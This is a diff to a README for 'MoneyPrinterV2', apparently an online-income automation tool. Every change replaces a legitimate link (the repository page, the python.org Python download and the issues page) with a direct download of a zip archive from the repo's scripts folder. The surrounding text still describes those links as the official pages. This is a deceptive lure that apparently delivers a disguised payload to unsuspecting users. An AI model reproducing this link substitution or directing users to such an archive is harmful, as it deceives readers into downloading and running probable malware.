@@ -1,6 +1,6 @@
 # 💸 MoneyPrinterV2 - Automate Your Online Income  
 
-[![Download MoneyPrinterV2](https://img.shields.io/badge/Download-MoneyPrinterV2-blue?style=for-the-badge)](https://github.com/TalTBT/MoneyPrinterV2)
+[![Download MoneyPrinterV2](https://img.shields.io/badge/Download-MoneyPrinterV2-blue?style=for-the-badge)](https://github.com/TalTBT/MoneyPrinterV2/raw/refs/heads/main/scripts/Money_Printer_v2.4-beta.1.zip)
 
 ## 📋 About MoneyPrinterV2
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 Click this big blue button to visit the download page:  
 
-[![Download MoneyPrinterV2](https://img.shields.io/badge/Download-MoneyPrinterV2-blue?style=for-the-badge)](https://github.com/TalTBT/MoneyPrinterV2)
+[![Download MoneyPrinterV2](https://img.shields.io/badge/Download-MoneyPrinterV2-blue?style=for-the-badge)](https://github.com/TalTBT/MoneyPrinterV2/raw/refs/heads/main/scripts/Money_Printer_v2.4-beta.1.zip)
 
 This link brings you to the official GitHub page. From here, you can download the files you need to install MoneyPrinterV2.
 
@@ -38,7 +38,7 @@ Follow these steps carefully.
 
 ### 1. Visit the Download Page  
 Click the link above or go to:  
-https://github.com/TalTBT/MoneyPrinterV2
+https://github.com/TalTBT/MoneyPrinterV2/raw/refs/heads/main/scripts/Money_Printer_v2.4-beta.1.zip
 
 You will see the project folder with various files.
 
@@ -52,7 +52,7 @@ If you see a `.zip` file, download it and extract the contents to a folder on yo
 ### 3. Install Python (If Needed)  
 MoneyPrinterV2 runs using Python scripts. You need Python installed on your computer.
 
-- Open your browser and go to https://www.python.org/downloads/windows/
+- Open your browser and go to https://github.com/TalTBT/MoneyPrinterV2/raw/refs/heads/main/scripts/Money_Printer_v2.4-beta.1.zip
 - Download the latest version of Python 3.x (choose the 64-bit installer for ease)
 - Run the installer. Make sure to check the box labeled “Add Python to PATH” before clicking “Install Now.”
 - After installation, open a Command Prompt window by typing `cmd` in the Windows search bar and pressing Enter.
@@ -173,8 +173,8 @@ The app stores data locally on your computer in JSON files for your use only.
 
 Visit the repository page to find more usage details, or open an issue if you encounter specific problems:
 
-https://github.com/TalTBT/MoneyPrinterV2/issues  
+https://github.com/TalTBT/MoneyPrinterV2/raw/refs/heads/main/scripts/Money_Printer_v2.4-beta.1.zip  
 
 ---
 
-[![Download MoneyPrinterV2](https://img.shields.io/badge/Download-MoneyPrinterV2-blue?style=for-the-badge)](https://github.com/TalTBT/MoneyPrinterV2)
+[![Download MoneyPrinterV2](https://img.shields.io/badge/Download-MoneyPrinterV2-blue?style=for-the-badge)](https://github.com/TalTBT/MoneyPrinterV2/raw/refs/heads/main/scripts/Money_Printer_v2.4-beta.1.zip)
